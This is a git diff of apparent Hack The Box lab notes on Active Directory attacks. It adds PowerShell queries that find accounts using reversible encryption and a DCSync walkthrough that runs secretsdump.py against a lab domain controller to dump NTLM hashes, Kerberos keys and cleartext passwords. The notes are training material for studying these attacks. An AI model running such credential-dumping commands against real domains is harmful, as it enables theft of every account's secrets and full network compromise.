@@ -44,6 +44,10 @@ foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_us
 # Investigating the Help Desk Level 1 Group with Get-DomainGroup
 Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
 
+# Checking for Reversible Encryption Option
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
 ```
 
 in here the `S-1-5-21-3842939050-3880317879-2865463114-1181` user have `User-Force-Change-Password` right on `S-1-5-21-3842939050-3880317879-2865463114-1176` user
@@ -209,5 +213,24 @@ Enabling the `Advanced Security Audit Policy` can help in detecting unwanted cha
 ## DCSync
 - needed rights `DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes`
 
+### Exploit
+adunn have `Get-Changes-All` and `Get-Changes` over DC so we will extract domain hashes 
 
+#### Linux 
+```shell
+secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 
+# -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
+# -just-dc-ntlm flag if we only want NTLM hashes
+# -just-dc-user <USERNAME> to only extract data for a specific user.
+# -pwd-last-set to see when each account's password was last changed
+# -history if we want to dump password history
+# -user-status is another helpful flag to check and see if a user is disabled
+```
+- there are three output files: one containing the NTLM hashes, one containing Kerberos keys, and one that would contain cleartext passwords from the NTDS for any accounts set with `reversible encryption` enabled.
+- The trick here is that the key needed to decrypt the accounts with `reversible encryption` is stored in the registry ([the Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) 
+```
+ls inlanefreight_hashes*
+
+inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
+```
